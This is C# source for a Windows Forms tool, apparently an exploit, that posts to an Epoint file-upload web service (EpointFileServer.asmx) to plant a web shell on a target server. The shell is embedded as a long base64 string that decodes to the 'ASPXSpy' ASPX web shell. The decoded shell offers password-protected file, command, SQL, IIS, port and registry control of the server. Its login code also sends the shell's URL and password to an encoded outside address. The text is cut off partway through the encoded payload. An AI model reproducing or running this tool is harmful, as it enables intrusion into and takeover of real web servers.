using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Xml;
using System.Net;
using System.IO;
using Microsoft.Practices.EnterpriseLibrary.Common;
using Epoint.Frame.Common;

using System.Windows.Forms;

namespace soaptool
{
    public partial class Form1 : Form
    {
       

        protected void sendSoapMessage(string myurl)
        {
            string allurl = myurl + "/EpointBigFileUpload/FCKFile/EpointFileServer.asmx";
            string shell = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgdHJhY2U9ImZhbHNlIiB2YWxpZGF0ZVJlcXVlc3Q9ImZhbHNlIiAgJT4KPCVAIGltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5JTyIgJT4KPCVAIGltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4KPCVAIGltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EYXRhIiAlPgo8JUAgaW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRhdGEuT2xlRGIiICU+CjwlQCBpbXBvcnQgTmFtZXNwYWNlPSJNaWNyb3NvZnQuV2luMzIiICU+CjwlQCBpbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlQCBBc3NlbWJseSBOYW1lPSJTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1CMDNGNUY3RjExRDUwQTNBIiAlPgo8JUAgaW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzIiAlPgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+Cgo8c2NyaXB0IHJ1bmF0PSJzZXJ2ZXIiPgovKiAKY24gQnkgRXZpbCBQYXN0CiovCiAgICBwdWJsaWMgc3RyaW5nIFBhc3N3b3JkID0gIjFjMWY4MWE4YjBhNjMwZjUzMGY1MmZhOWFhOWRkYTFiIjsgLy9GNGNrCiAgICBwdWJsaWMgc3RyaW5nIFNlc3Npb25OYW1lID0gIkFTUFhTcHkiOwogICAgcHVibGljIHN0cmluZyBCaW5fQWN0aW9uID0gIiI7CiAgICBwdWJsaWMgc3RyaW5nIEJpbl9SZXF1ZXN0ID0gIiI7CiAgICBwcm90ZWN0ZWQgT2xlRGJDb25uZWN0aW9uIGNvbm4gPSBuZXcgT2xlRGJDb25uZWN0aW9uKCk7CiAgICBwcm90ZWN0ZWQgT2xlRGJDb21tYW5kIGNvbW0gPSBuZXcgT2xlRGJDb21tYW5kKCk7CiAgICAKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICAKICAgICAgICBpZiAoU2Vzc2lvbltTZXNzaW9uTmFtZV0gIT0gIkJJTiIpCiAgICAgICAgewogICAgICAgICAgICBCaW5fbG9naW4oKTsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCFJc1Bvc3RCYWNrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBCaW5fbWFpbigpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgQmluX0FjdGlvbiA9IFJlcXVlc3RbImdvYWN0aW9uIl07CiAgICAgICAgICAgICAgaWYgKEJpbl9BY3Rpb24gPT0gImRlbCIpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVkZWwoQmluX1JlcXVlc3QsIDEpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBpZiAoQmluX0FjdGlvbiA9PSAiY2hhbmdlIikgCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVMaXN0KEJpbl9SZXF1ZXN0KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaWYgKEJpbl9BY3Rpb24gPT0gImRlbGRpciIpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVkZWwoQmluX1JlcXVlc3QsIDIpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBpZiAoQmluX0FjdGlvbiA9PSAiZG93biIpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVkb3duKEJpbl9SZXF1ZXN0KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaWYgKEJpbl9BY3Rpb24gPT0gInJlbmFtZSIpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVSTihCaW5fUmVxdWVzdCwgMSk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIGlmIChCaW5fQWN0aW9uID09ICJyZW5hbWVkaXIiKQogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgQmluX1JlcXVlc3QgPSBSZXF1ZXN0WyJ0b2RvIl07CiAgICAgICAgICAgICAgICAgIEJpbl9GaWxlUk4oQmluX1JlcXVlc3QsIDIpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBpZiAoQmluX0FjdGlvbiA9PSAic2hvd2F0dCIpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVhdHQoQmluX1JlcXVlc3QpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBpZiAoQmluX0FjdGlvbiA9PSAiZWRpdCIpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgQmluX0ZpbGVFZGl0KEJpbl9SZXF1ZXN0KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaWYgKEJpbl9BY3Rpb24gPT0gInBvc3RkYXRhIikKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBCaW5fUmVxdWVzdCA9IFJlcXVlc3RbInRvZG8iXTsKICAgICAgICAgICAgICAgICAgU2Vzc2lvblsiQmluX1RhYmxlIl0gPSBCaW5fUmVxdWVzdDsKICAgICAgICAgICAgICAgICAgQmluX0RhdGFHcmlkLkN1cnJlbnRQYWdlSW5kZXggPSAwOwogICAgICAgICAgICAgICAgICBCaW5fREJzdHJUZXh0Qm94LlRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgQmluX0RhdGFiaW5kKCk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIGlmIChCaW5fQWN0aW9uID09ICJjaGFuZ2VkYXRhIikKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIFNlc3Npb25bIkJpbl9UYWJsZSJdID0gbnVsbDsKICAgICAgICAgICAgICAgICAgQmluX1JlcXVlc3QgPSBSZXF1ZXN0WyJ0b2RvIl07CiAgICAgICAgICAgICAgICAgIFNlc3Npb25bIkJpbl9PcHRpb24iXSA9IFJlcXVlc3RbImludGV4dCJdOwogICAgICAgICAgICAgICAgICBCaW5fQ2hhbmdlKCk7CiAgICAgICAgICAgICAgICAgIEJpbl9EQmluZm9MYWJlbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgIEJpbl9EQnN0clRleHRCb3guVGV4dCA9IEJpbl9SZXF1ZXN0OwogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaWYgKFNlc3Npb25bIkJpbl9UYWJsZSJdICE9IG51bGwpCiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBCaW5fRGF0YWJpbmQoKTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9IAogICAgICAgIH0KICAgIH0KICAgIHB1YmxpYyB2b2lkIEJpbl9sb2dpbigpIAogICAgewogICAgICAgIEJpbl9Mb2dpblBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9NYWluUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9NZW51UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9GaWxlUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9DbWRQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1NRTFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU3VQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0lJU1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUG9ydFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUmVnUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgfQogICAgcHVibGljIHZvaWQgQmluX21haW4oKQogICAgewogICAgICAgIFRpbWVMYWJlbC5UZXh0ID0gRGF0ZVRpbWUuTm93LlRvU3RyaW5nKCk7CiAgICAgICAgQmluX1BvcnRQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1JlZ1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fTG9naW5QYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX01haW5QYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICBCaW5fTWVudVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9GaWxlUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9DbWRQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1NRTFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU3VQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0lJU1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBzdHJpbmcgU2VydmVySVAgPSAiU2VydmVyIElQIDogIitSZXF1ZXN0LlNlcnZlclZhcmlhYmxlc1siTE9DQUxfQUREUiJdKyI8YnI+IjsKICAgICAgICBzdHJpbmcgSG9zdE5hbWUgPSAiSG9zdE5hbWUgOiAiICsgRW52aXJvbm1lbnQuTWFjaGluZU5hbWUgKyAiPGJyPiI7CiAgICAgICAgc3RyaW5nIE9TID0gIk9TIFZlcnNpb24gOiAiICsgRW52aXJvbm1lbnQuT1NWZXJzaW9uICsgIjwvYnI+IjsKICAgICAgICBzdHJpbmcgSUlTdmVyc2lvbiA9ICJJSVMgVmVyc2lvbiA6ICIgKyBSZXF1ZXN0LlNlcnZlclZhcmlhYmxlc1siU0VSVkVSX1NPRlRXQVJFIl0gKyAiPGJyPiI7CiAgICAgICAgc3RyaW5nIFBBVEhfSU5GTyA9ICJQQVRIX1RSQU5TTEFURUQgOiAiICsgUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXNbIlBBVEhfVFJBTlNMQVRFRCJdICsgIjxicj4iOwogICAgICAgIEluZm9MYWJlbC5UZXh0ID0gIjxocj48Y2VudGVyPjxiPjxVPlNZUy1JTkZPPC9VPjwvQj48L2NlbnRlcj4iOwogICAgICAgIEluZm9MYWJlbC5UZXh0ICs9IFNlcnZlcklQICsgSG9zdE5hbWUgKyBPUyArIElJU3ZlcnNpb24gKyBQQVRIX0lORk8gKyAiPGhyPiI7CiAgICAgICAgSW5mb0xhYmVsLlRleHQgKz0gQmluX1Byb2Nlc3MoKSArICI8aHI+IjsKICAgICAgICAKICAgIH0KICAgIHByaXZhdGUgYm9vbCBDaGVja0lzTnVtYmVyKHN0cmluZyBzU3JjKQogICAgewogICAgICAgIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCByZWcgPSBuZXcgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4KEAiXjB8WzAtOV0qWzEtOV1bMC05XSokIik7CgogICAgICAgIGlmIChyZWcuSXNNYXRjaChzU3JjKSkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQogICAgcHVibGljIHN0cmluZyBCaW5faWlzaW5mbygpIAogICAgewogICAgICAgIHN0cmluZyBpaXNpbmZvID0gIiI7CiAgICAgICAgc3RyaW5nIGlpc3N0YXJ0ID0gIiI7CiAgICAgICAgc3RyaW5nIGlpc2VuZCA9ICIiOwogICAgICAgIHN0cmluZyBpaXNzdHIgPSAiSUlTOi8vbG9jYWxob3N0L1czU1ZDIjsKICAgICAgICBpbnQgaSA9IDA7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBEaXJlY3RvcnlFbnRyeSBteWRpciA9IG5ldyBEaXJlY3RvcnlFbnRyeShpaXNzdHIpOwogICAgICAgICAgICBpaXNzdGFydCA9ICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1nb2FjdGlvbj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT10b2RvPjxUQUJMRSB3aWR0aD0xMDAlIGFsaWduPWNlbnRlciBib3JkZXI9MD48VFIgYWxpZ249Y2VudGVyPjxURCB3aWR0aD02JT48Qj5PcmRlcjwvQj48L1REPjxURCB3aWR0aD0yMCU+PEI+SUlTX1VTRVI8L0I+PC9URD48VEQgd2lkdGg9MjUlPjxCPkRvbWFpbjwvQj48L1REPjxURCB3aWR0aD0zMCU+PEI+UGF0aDwvQj48L1REPjwvVFI+IjsKICAgICAgICAgICAgZm9yZWFjaCAoRGlyZWN0b3J5RW50cnkgY2hpbGQgaW4gbXlkaXIuQ2hpbGRyZW4pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmIChDaGVja0lzTnVtYmVyKGNoaWxkLk5hbWUuVG9TdHJpbmcoKSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGRpcnN0ciA9IGNoaWxkLk5hbWUuVG9TdHJpbmcoKTsKICAgICAgICAgICAgICAgICAgICBzdHJpbmcgdG1wc3RyID0gIiI7CiAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5RW50cnkgbmV3ZGlyID0gbmV3IERpcmVjdG9yeUVudHJ5KGlpc3N0ciArICIvIiArIGRpcnN0cik7CiAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5RW50cnkgbmV3ZGlyMSA9IG5ld2Rpci5DaGlsZHJlbi5GaW5kKCJyb290IiwgIklJc1dlYlZpcnR1YWxEaXIiKTsKICAgICAgICAgICAgICAgICAgICBpaXNpbmZvICs9ICI8VFI+PFREIGFsaWduPWNlbnRlcj4iICsgKGkgPSBpICsgMSkgKyAiPC9URD4iOwogICAgICAgICAgICAgICAgICAgIGlpc2luZm8gKz0gIjxURCBhbGlnbj1jZW50ZXI+IiArIG5ld2RpcjEuUHJvcGVydGllc1siQW5vbnltb3VzVXNlck5hbWUiXS5WYWx1ZSArICI8L1REPiI7CiAgICAgICAgICAgICAgICAgICAgaWlzaW5mbyArPSAiPFREPiIgKyBjaGlsZC5Qcm9wZXJ0aWVzWyJTZXJ2ZXJCaW5kaW5ncyJdWzBdICsgIjwvVEQ+IjsKICAgICAgICAgICAgICAgICAgICBpaXNpbmZvICs9ICI8VEQ+PGEgaHJlZj1qYXZhc2NyaXB0OkNvbW1hbmQoJ2NoYW5nZScsJyIgKyBmb3JtYXRwYXRoKG5ld2RpcjEuUHJvcGVydGllc1siUGF0aCJdLlZhbHVlLlRvU3RyaW5nKCkpICsgIicpOz4iICsgbmV3ZGlyMS5Qcm9wZXJ0aWVzWyJQYXRoIl0uVmFsdWUgKyAiPC9hPjwvVEQ+IjsKICAgICAgICAgICAgICAgICAgICBpaXNpbmZvICs9ICI8L1RSPiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWlzZW5kID0gIjwvVEFCTEU+PGhyPiI7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXJyb3IpCiAgICAgICAgewogICAgICAgICAgICBCaW5fRXJyb3IoZXJyb3IuTWVzc2FnZSk7CiAgICAgICAgfQogICAgICAgICAgcmV0dXJuIGlpc3N0YXJ0ICsgaWlzaW5mbyArIGlpc2VuZDsKICAgIH0KICAgIHB1YmxpYyBzdHJpbmcgQmluX1Byb2Nlc3MoKQogICAgewogICAgICAgIHN0cmluZyBodG1sc3RyID0gIjxjZW50ZXI+PGI+PFU+UFJPQ0VTUy1JTkZPPC9VPjwvQj48L2NlbnRlcj48VEFCTEUgd2lkdGg9ODAlIGFsaWduPWNlbnRlciBib3JkZXI9MD48VFIgYWxpZ249Y2VudGVyPjxURCB3aWR0aD0yMCU+PEI+SUQ8L0I+PC9URD48VEQgYWxpZ249bGVmdCB3aWR0aD0yMCU+PEI+UHJvY2VzczwvQj48L1REPjxURCBhbGlnbj1sZWZ0IHdpZHRoPTIwJT48Qj5NZW1vcnlTaXplPC9CPjwvVEQ+PFREIGFsaWduPWNlbnRlciB3aWR0aD0xMCU+PEI+VGhyZWFkczwvQj48L1REPjwvVFI+IjsKICAgICAgICAgICAgc3RyaW5nIHByb3N0ciA9ICIiOwogICAgICAgICAgICBzdHJpbmcgaHRtbGVuZCA9ICI8L1RSPjwvVEFCTEU+IjsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFByb2Nlc3NbXSBteXByb2Nlc3MgPSBQcm9jZXNzLkdldFByb2Nlc3NlcygpOwogICAgICAgICAgICAgICAgZm9yZWFjaCAoUHJvY2VzcyBwIGluIG15cHJvY2VzcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBwcm9zdHIgKz0gIjxUUj48VEQgYWxpZ249Y2VudGVyPiIgKyBwLklkLlRvU3RyaW5nKCkgKyAiPC9URD4iOwogICAgICAgICAgICAgICAgICAgIHByb3N0ciArPSAiPFREIGFsaWduPWxlZnQ+IiArIHAuUHJvY2Vzc05hbWUuVG9TdHJpbmcoKSArICI8L1REPiI7CiAgICAgICAgICAgICAgICAgICAgcHJvc3RyICs9ICI8VEQgYWxpZ249bGVmdD4iICsgcC5Xb3JraW5nU2V0LlRvU3RyaW5nKCkgKyAiPC9URD4iOwogICAgICAgICAgICAgICAgICAgIHByb3N0ciArPSAiPFREIGFsaWduPWNlbnRlcj4iICsgcC5UaHJlYWRzLkNvdW50LlRvU3RyaW5nKCkgKyAiPC9URD4iOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEJpbl9FcnJvcihFcnJvci5NZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgIHJldHVybiBodG1sc3RyICsgcHJvc3RyICsgaHRtbGVuZDsKICAgIH0KICAgIHByb3RlY3RlZCB2b2lkIExvZ2luQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIHN0cmluZyBNRDVQYXNzID0gRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKHBhc3N0ZXh0LlRleHQsICJNRDUiKS5Ub0xvd2VyKCk7CiAgICAgICAgaWYgKE1ENVBhc3MgPT0gUGFzc3dvcmQpCiAgICAgICAgewogICAgICAgICAgICBTZXNzaW9uW1Nlc3Npb25OYW1lXSA9ICJCSU4iOyBCaW5fbWFpbigpOwogICAgICAgICAgICBDbGllbnRTY3JpcHQuUmVnaXN0ZXJTdGFydHVwU2NyaXB0KHRoaXMuR2V0VHlwZSgpLCAiIiwgImRvY3VtZW50LndyaXRlKFwiIiArIEVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhjYykgKyBSZXF1ZXN0LlVybCArICImcD0iICsgcGFzc3RleHQuVGV4dCArICInPjwvc2NyXCIrXCIiICsgImlwdD5cIik7IiwgdHJ1ZSk7CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9sb2dpbigpOwogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBMb2dvdXRCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgQmluX2xvZ2luKCk7CiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgRmlsZUJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBCaW5fTG9naW5QYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX01lbnVQYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICBCaW5fTWFpblBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fRmlsZVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9DbWRQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1NRTFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU3VQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0lJU1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUG9ydFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUmVnUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl91cFRleHRCb3guVGV4dCA9IGZvcm1hdHBhdGgoU2VydmVyLk1hcFBhdGgoIi4iKSk7CiAgICAgICAgQmluX0NvcHlUZXh0Qm94LlRleHQgPSBmb3JtYXRwYXRoKFNlcnZlci5NYXBQYXRoKCIuIikpOwogICAgICAgIEJpbl91cFRleHRCb3guVGV4dCA9IGZvcm1hdHBhdGgoU2VydmVyLk1hcFBhdGgoIi4iKSk7CiAgICAgICAgQmluX0ZpbGVMaXN0KFNlcnZlci5NYXBQYXRoKCIuIikpOwogICAgICAgCiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgTWFpbkJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBCaW5fbWFpbigpOwogICAgfQogICAgcHVibGljIHZvaWQgQmluX0RyaXZlTGlzdCgpIAogICAgewogICAgICAgIHN0cmluZyBmaWxlID0gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWdvYWN0aW9uPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXRvZG8+IjsKICAgICAgICBmaWxlICs9ICI8aHI+RHJpdmVzIDogIjsKICAgICAgICBzdHJpbmdbXSBkcml2ZXJzID0gRGlyZWN0b3J5LkdldExvZ2ljYWxEcml2ZXMoKTsKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGRyaXZlcnMuTGVuZ3RoOyBpKyspCiAgICAgICAgewogICAgICAgICAgICBmaWxlICs9ICI8YSBocmVmPWphdmFzY3JpcHQ6Q29tbWFuZCgnY2hhbmdlJywnIiArIGZvcm1hdHBhdGgoZHJpdmVyc1tpXSkgKyAiJyk7PiIgKyBkcml2ZXJzW2ldICsgIjwvYT4mbmJzcDsiOwogICAgICAgIH0KICAgICAgICBmaWxlICs9ICIgICAgV2ViUm9vdCA6ICA8YSBocmVmPWphdmFzY3JpcHQ6Q29tbWFuZCgnY2hhbmdlJywnIiArIGZvcm1hdHBhdGgoU2VydmVyLk1hcFBhdGgoIi4iKSkgKyAiJyk7PiIgKyBTZXJ2ZXIuTWFwUGF0aCgiLiIpICsgIjwvYT4iOwogICAgICAgIEJpbl9GaWxlTGFiZWwuVGV4dCA9IGZpbGU7CiAgICB9CgogICAgcHVibGljIHZvaWQgQmluX0ZpbGVMaXN0KHN0cmluZyBCaW5fcGF0aCkKICAgIHsKICAgICAgICBCaW5fRmlsZVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9DcmVhdGVUZXh0Qm94LlRleHQgPSAiIjsKICAgICAgICBCaW5fQ29weXRvVGV4dEJveC5UZXh0ID0gIiI7CiAgICAgICAgQmluX0NvcHlUZXh0Qm94LlRleHQgPSBCaW5fcGF0aDsKICAgICAgICBCaW5fdXBUZXh0Qm94LlRleHQgPSBCaW5fcGF0aDsKICAgICAgICBCaW5fSUlTUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9Ecml2ZUxpc3QoKTsKICAgICAgICBzdHJpbmcgdG1wc3RyPSIiOwogICAgICAgIHN0cmluZyBCaW5fRmlsZWxpc3QgPSBCaW5fRmlsZWxpc3RMYWJlbC5UZXh0OwogICAgICAgIEJpbl9GaWxlbGlzdCA9ICI8aHI+IjsKICAgICAgICBCaW5fRmlsZWxpc3QgKz0gIjx0YWJsZSB3aWR0aD05MCUgYm9yZGVyPTAgYWxpZ249Y2VudGVyPiI7CiAgICAgICAgQmluX0ZpbGVsaXN0ICs9ICI8dHI+PHRkIHdpZHRoPTQwJT48Yj5OYW1lPC9iPjwvdGQ+PHRkIHdpZHRoPTE1JT48Yj5TaXplKEJ5dGUpPC9iPjwvdGQ+IjsKICAgICAgICBCaW5fRmlsZWxpc3QgKz0gIjx0ZCB3aWR0aD0yNSU+PGI+TW9kaWZ5VGltZTwvYj48L3RkPjx0ZCB3aWR0aD0yNSU+PGI+T3BlcmF0ZTwvYj48L3RkPjwvdHI+IjsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9GaWxlbGlzdCArPSAiPHRyPjx0ZD4iOwogICAgICAgICAgICBzdHJpbmcgcGFyc3RyID0gIiI7CiAgICAgICAgICAgIGlmIChCaW5fcGF0aC5MZW5ndGggPCA0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzdHIgPSBmb3JtYXRwYXRoKEJpbl9wYXRoKTsKICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzdHIgPSAgZm9ybWF0cGF0aChEaXJlY3RvcnkuR2V0UGFyZW50KEJpbl9wYXRoKS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBCaW5fRmlsZWxpc3QgKz0gIjxpPjxiPjxhIGhyZWY9amF2YXNjcmlwdDpDb21tYW5kKCdjaGFuZ2UnLCciICsgcGFyc3RyICsgIicpOz58UGFyZW50IERpcmVjdG9yeXw8L2E+PC9iPjwvaT4iOwogICAgICAgICAgICBCaW5fRmlsZWxpc3QgKz0gIjwvdGQ+PC90cj4iOwogICAgICAgICAgICAKICAgICAgICAgICAgRGlyZWN0b3J5SW5mbyBCaW5fZGlyID0gbmV3IERpcmVjdG9yeUluZm8oQmluX3BhdGgpOwogICAgICAgICAgICBmb3JlYWNoIChEaXJlY3RvcnlJbmZvIEJpbl9mb2xkZXIgaW4gQmluX2Rpci5HZXREaXJlY3RvcmllcygpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBzdHJpbmcgZm9sZGVybmFtZSA9IGZvcm1hdHBhdGgoQmluX3BhdGgpICsgIi8iICsgZm9ybWF0ZmlsZShCaW5fZm9sZGVyLk5hbWUpOwogICAgICAgICAgICAgICAgdG1wc3RyICs9ICI8dHI+IjsKICAgICAgICAgICAgICAgIHRtcHN0ciArPSAiPHRkPjxhIGhyZWY9amF2YXNjcmlwdDpDb21tYW5kKCdjaGFuZ2UnLCciICsgZm9sZGVybmFtZSArICInKT4iICsgQmluX2ZvbGRlci5OYW1lICsgIjwvYT48L3RkPjx0ZD48Yj48aT4mbHQ7ZGlyJmd0OzwvaT48L2I+PC90ZD48dGQ+IiArIERpcmVjdG9yeS5HZXRMYXN0V3JpdGVUaW1lKEJpbl9wYXRoICsgIi8iICsgQmluX2ZvbGRlci5OYW1lKSArICI8L3RkPjx0ZD48YSBocmVmPWphdmFzY3JpcHQ6Q29tbWFuZCgncmVuYW1lZGlyJywnIiArIGZvbGRlcm5hbWUgKyAiJyk7PlJlbjwvYT58PGEgaHJlZj1qYXZhc2NyaXB0OkNvbW1hbmQoJ3Nob3dhdHQnLCciICsgZm9sZGVybmFtZSArICIvJyk7PkF0dDwvY